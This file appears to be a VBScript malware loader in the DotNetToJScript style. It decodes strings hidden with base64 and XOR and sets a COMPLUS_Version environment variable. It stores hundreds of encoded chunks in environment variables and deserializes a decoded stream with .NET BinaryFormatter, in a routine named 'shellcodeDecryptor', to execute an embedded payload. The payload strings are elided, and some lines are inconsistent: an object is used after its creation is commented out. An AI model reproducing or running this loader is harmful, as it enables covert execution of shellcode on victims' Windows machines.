Function qsvoRqI(vVuO)
    Dim pmYp, zFOvnLg(255)
    Dim dZHd, OgfAo, GczEnsY, HHUw, vEjIGM, uRNipg, MZXH
    b64word = "ABCDEFGH"
    b64word = b64word & "IJKLMNOP"
    b64word = b64word & "QRSTUVWX"
    b64word = b64word & "YZabcdef"
    b64word = b64word & "ghijklmn"
    b64word = b64word & "opqrstuv"
    b64word = b64word & "wxyz0123"
    b64word = b64word & "456789+/"
    For HHUw = 0 To Len(b64word) - 1
        zFOvnLg(Asc(Mid(b64word, HHUw + 1, 1))) = HHUw
    Next
    OgfAo = 1
    dZHd = ""
    MZXH = 0
    For HHUw = 1 To Len(vVuO)
        uRNipg = Asc(Mid(vVuO, HHUw, 1))
        If uRNipg = Asc("=") Then
            MZXH = MZXH + 1
        Else
            vEjIGM = zFOvnLg(uRNipg)
            Select Case (HHUw - OgfAo) Mod 4
                Case 0
                    GczEnsY = vEjIGM * 4
                Case 1
                    GczEnsY = GczEnsY + Int(vEjIGM / 16)
                    dZHd = dZHd & Chr(GczEnsY)
                    GczEnsY = (vEjIGM And 15) * 16
                Case 2
                    GczEnsY = GczEnsY + Int(vEjIGM / 4)
                    dZHd = dZHd & Chr(GczEnsY)
                    GczEnsY = (vEjIGM And 3) * 64
                Case 3
                    GczEnsY = GczEnsY + vEjIGM
                    dZHd = dZHd & Chr(GczEnsY)
                    OgfAo = HHUw + 1
            End Select
        End If
    Next
    If OgfAo <= Len(vVuO) Then
        dZHd = dZHd & Chr(GczEnsY)
    End If
    qsvoRqI = Left(dZHd, ((Len(vVuO) / 4) * 3) - MZXH)
End Function

Function QJINzR(oLLbY, BzVArc)
    Dim MReXZnG, pPRPHKI
    pPRPHKI = ""
    For MReXZnG = 1 To Len(oLLbY)
        pPRPHKI = pPRPHKI & Chr(Asc(Mid(oLLbY, MReXZnG, 1)) Xor Asc(Mid(BzVArc, (MReXZnG - 1) Mod Len(BzVArc) + 1, 1)))
    Next
    QJINzR = pPRPHKI
End Function

Function WyPJVx(wrBxuTr, LgwATC)
    WyPJVx = QJINzR(qsvoRqI(wrBxuTr), LgwATC)
End Function

'MsgBox WyPJVx("NhwSQwYOHzdITUFNdH53Kn52QwJeVF1DVg==", "eea7cc1c-55c5-4c73-a104-19b033299271")

' Set CLlnaIg = CreateObject(WyPJVx("bzIHEQpJTR1+WVAKXg==", "8adcc993-15f2-44f6-bac1-fb306f034dab"))
' CLlnaIg.Environment(WyPJVx("NURZW11LQg==", "e6688814-bf9c-42de-974a-0934036fa1d6")).Item(WyPJVx("IXl4aS9gNzt7VREVXEJa", "b659c5dd-0cf5-455a-946c-b9736226bd0c")) = WyPJVx("E1IZVRwKAAUcDg==", "ef7e2906-7e45-428a-b982-45fdd5aa0b24")

Dim ws
Set ws = CreateObject("WScript.shell")
ws.Environment("Process").Item("v4.0.30319") = "COMPLUS_Version"

Function shellcodeDecryptor(inputStr, strLength)
    Dim encData, MQatBWH, qMZBuCa, OpJT, FJUiH, dURAmsY, UQRP
    encData = Replace(inputStr, " ", "")
    MQatBWH = StrReverse(encData)
    wbFYG = 4 - (Len(MQatBWH) Mod 4)
    If wbFYG < 4 Then qMZBuCa = MQatBWH & String(wbFYG, "=") Else qMZBuCa = MQatBWH
    Set OpJT = CreateObject("System.Text.ASCIIEncoding")
    FJUiH = OpJT.GetByteCount_2(qMZBuCa)
    Set b64dec = CreateObject("System.Security.Cryptography.fromBase64Transform")
    Set UQRP = CreateObject("System.IO.MemoryStream")
    UQRP.Write b64dec.TransformFinalBlock(OpJT.GetBytes_4(qMZBuCa), 0, FJUiH), 0, strLength
    UQRP.Position = 0
    Set shellcodeDecryptor = UQRP
End Function

Dim Xuxzl
Xuxzl = "..." ' very big strings

Dim iICMct
Set iICMct = CLlnaIg.Environment(WyPJVx("NEZWV1UWQA==", "d4940e3a-83de-44a9-9c9b-e30a83131838"))
iICMct.Item("B_1") = "...B_1..." ' big string
' snip B_2 to B_447
iICMct.Item("B_448") = "...B_448..." ' big string

Dim launcher
Set launcher = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
launcher.Deserialize_2(shellcodeDecryptor(Xuxzl, 37317))